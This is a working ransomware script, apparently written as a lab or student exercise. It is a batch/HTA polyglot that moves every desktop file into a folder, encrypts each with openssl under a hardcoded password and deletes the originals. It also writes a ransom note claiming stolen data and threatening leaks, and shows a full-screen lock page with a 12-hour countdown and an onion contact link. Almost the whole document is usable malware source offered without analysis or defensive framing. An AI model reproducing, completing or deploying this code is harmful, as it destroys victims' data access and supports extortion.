<!-- Batch Section
@echo off
setlocal enabledelayedexpansion

REM @2023-CEVIK Meryem

REM Dossier source
set "source_folder=C:\Users\vboxuser\Desktop"

REM Dossier de destination
set "encrypted_folder=C:\Users\vboxuser\Desktop\encrypted"

REM Mot de passe pour le cryptage
set "mot_de_passe=HACK127_fOB0?a4?644x4aeR"

REM Création du dossier encrypted (s'il n'existe pas)
if not exist "%encrypted_folder%" mkdir "%encrypted_folder%"

REM Déplacement des fichiers depuis le dossier source vers le dossier encrypted (y compris les sous-dossiers)
for /r "%source_folder%" %%f in (*.*) do (
    move "%%f" "%encrypted_folder%\"
)

REM Cryptage des fichiers dans le dossier encrypted
for %%f in ("%encrypted_folder%\*.*") do (
    openssl enc -aes-256-cbc -salt -pass "pass:%mot_de_passe%" -in "%%f" -out "%%f.enc"
    del /q "%%f"
)

REM Création du fichier texte
echo Your ID is: - 6768 > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Q: How to contact us > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo A: Install session messenger from this link : https://hack127.onion And chat with us.> "%source_folder%\readme.txt"
echo Your ID is : 6768 > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo ** Make sure to include the ID in the first line of messages or subject of email, otherwise we won’t answer your messages. > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Q: What's Happened > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo A: Your files have been encrypted. The file structure has been changed to unreadable format, so they are inaccessible. > "%source_folder%\readme.txt"
echo Your critical information has been downloaded, including databases, financial/developmental, accounting, and strategic documents. > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Q: How to recover files > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo A: If you want to decrypt all of your data and return your systems to operative state, you require a decryption tool. > "%source_folder%\readme.txt"
echo We are the only ones who own it, and also, if you want your stolen data will be wiped out from our systems, you'd better contact us within a maximum of 10 days. > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Q: What about guarantees > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo It's just a business and we don't pursue any political objectives. We absolutely do not care about you and your data. > "%source_folder%\readme.txt"
echo Except the money and our reputation are the only things that matters to us. if we do not do our work and liabilities, nobody will cooperate with us which is not in our interests. > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Q: How will the decryption process proceed after payment > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo A: After payment, we will send you our decryption program + detailed instructions for use. With this program, you will be able to decrypt all your encrypted files. > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo *** Important *** > "%source_folder%\readme.txt"
echo 1-  If you want the decryption procedure to be effective, DO NOT delete or modify the encrypted files, it will cause issues with the decryption process. > "%source_folder%\readme.txt"
echo 2-  Beware Any organization or individual who asserts they can decrypt your data without paying us should be avoided. They just deceive you and charge you much more money as a consequence; they all contact us and buy the decryption tool from us. > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo Q: If you do not want to pay us or you pay us late > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo A: It does not matter to us, but you have to accept its consequences: > "%source_folder%\readme.txt"
echo. >> "%source_folder%\readme.txt"
echo 1- Your data will be leaked for free on TOR darknet and your competitors can have access to your data. > "%source_folder%\readme.txt"
echo 2- We know exactly what vulnerabilities exist in your network and will inform google about them. The money we asked for is nothing compare to all of these damages to your business so we recommend you to pay the price and secure your business. If you pay we will give you tips for your security so it can’t be hacked in the future. > "%source_folder%\readme.txt"
echo Besides you will lose your time and data cause we are the only ones that have the private key. In practice - time is much more valuable. > "%source_folder%\readme.txt"


REM Fin du script
endlocal

REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

-->
<!DOCTYPE html>
<html>
<head>
    <title>Your personal files are encrypted!</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="yes" 
                     minimizebutton="yes" 
                     sysmenu="yes" 
                     Caption="yes" 
                     windowstate="maximize"/> 
    <style>
        body {
            background-color: #8c1d1d;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        #header {
            display: none; /* Masquer l'en-tête */
        }
        #message {
            padding: 10%;
            position: relative;
        }
        #message p {
            font-size: 24px;
            margin: 20px 0;
        }
        #timer {
            font-size: 48px;
            color: #FFD700;
            font-weight: bold;
        }
        #image {
            position: absolute;
            top: 20px;
            right: 20px;
            width: 200px;
        }
        #image img {
            max-width: 100%;
        }
        #private-key {
            margin-top: 20px;
        }
        #private-key p {
            font-size: 18px;
        }
        #title-box {
            background-color: white;
            border-radius: 20px;
            padding: 20px;
            margin-top: 20px;
        }
        #title-box h1 {
            font-size: 36px;
            margin: 0;
        }
    </style>
    <script>
        function startTimer() {
            var countDownDate = new Date().getTime() + 12 * 60 * 60 * 1000; // 12 heures en millisecondes

            var x = setInterval(function() {
                var now = new Date().getTime();
                var distance = countDownDate - now;

                var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                var seconds = Math.floor((distance % (1000 * 60)) / 1000);

                document.getElementById("timer").innerHTML = hours + "h " + minutes + "m " + seconds + "s ";

                if (distance < 0) {
                    clearInterval(x);
                    document.getElementById("timer").innerHTML = "Time Expired";
                }
            }, 1000);

            // Ouvrir en plein écran
            var elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari et Opera
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) { // IE/Edge
                elem.msRequestFullscreen();
            }
        }

        window.onload = startTimer; // Démarrer le timer et le plein écran lorsque la page est chargée
    </script>
</head>
<body scroll="no">
    <div id="header">
        <h1>Your personal files are encrypted!</h1>
    </div>
    <div id="message">
        <p>Your Files Have Been Encrypted by Hack127!</p>
        <p>If you want to restore them, follow this link: <a href="http://hack127.onion" target="_blank" style="color: #00FF00;">http://hack127.onion</a></p>
        <p>Your ID : 6768</p>
        <p>If you do not respond to us within 12 hours, your files will be published on the dark web.</p>
        <div id="private-key">
            <p>Private key will be destroyed on</p>
            <p><?php echo date("d/m/Y h:i A", strtotime("+12 hours")); ?></p>
        </div>
        <div id="timer"></div>
        <div id="timer"></div>
        <img id="imagen" alt="Candado" src="https://i.imgur.com/rytGPFG.png" height="130" width="100">
    </div>
</body>
</html>
